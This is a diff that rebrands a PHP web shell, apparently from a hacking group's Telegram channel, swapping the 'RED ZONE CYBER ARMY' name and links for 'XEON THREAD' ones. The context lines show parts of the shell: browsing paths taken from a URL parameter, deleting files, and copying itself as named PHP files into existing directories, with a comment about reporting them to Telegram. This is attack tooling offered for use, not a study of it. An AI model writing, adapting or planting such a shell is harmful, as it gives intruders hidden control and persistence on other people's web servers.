@@ -38,7 +38,7 @@ echo '<!DOCTYPE HTML>
 <HTML>
 <HEAD>
 <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
-<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"><title>RED ZONE WEBSHELL</title>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"><title>XEON THREAD WEBSHELL</title>
 <style>
 body {
     font-family: "Racing Sans One", cursive;
@@ -192,7 +192,7 @@ pre {
 </HEAD>
 <BODY>
 <div class="container">
-<H1 class="text-center">RED ZONE CYBER ARMY  <span class=\'R3DZ0N3-icon\'></H1>
+<H1 class="text-center">XEON THREAD  <span class=\'R3DZ0N3-icon\'></H1>
 <table class="table table-dark" cellpadding="3" cellspacing="1" >
 <tr><td><center>Current Path : ';
 if(isset($_GET['path'])){
@@ -303,7 +303,7 @@ echo '<div class="alert alert-danger" role="alert">Delete File Error.</div>';
 }
 echo '<center>';
 echo '<button class="btn btn-Telegram" onclick="location.href=\'https://t.me/Team_R3DZ0N3\'">';echo '<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Telegram_2019_Logo.svg/800px-Telegram_2019_Logo.svg.png" style="height: 40px;" alt="Telegram Icon">';
-echo ' RED ZONE</button>';
+echo ' </button>';
 echo '<br><br>';
 echo '</center>';
 $scandir = scandir($path);
@@ -450,12 +450,12 @@ if (count($directories) < 5) {
     }
     
     // Send notification to Telegram for remaining directories
-    $message = "Only " . $remainingCount . " directories available. Created RedZone.php in existing directories.";
+    $message = "Only " . $remainingCount . " directories available. Created XeonThread.php in existing directories.";
     
     // Send URLs of created files in existing directories
     $fileURLs = array();
     foreach ($existingDirectories as $directory) {
-        $fileURLs[] = getDirectoryURL($directory) . '/R3DZ0N3.php';
+        $fileURLs[] = getDirectoryURL($directory) . '/XEONTHREAD.php';
     }
     
     exit;
@@ -489,8 +489,8 @@ function getDirectoryURL($directory) {
 ?>
 </div>
 <span class="backlink">
-    <a href="https://t.me/redzonecyberarmy">RED ZONE CYBER ARMY</a>,
+    <a href="https://t.me/xeonthread">XEON THREAD</a>,
 </span>
-<center><h6>Telegram @Team_R3DZ0N3</h6>
+<center><h6>Telegram @xeonthread</h6>
 </BODY>
 </HTML>
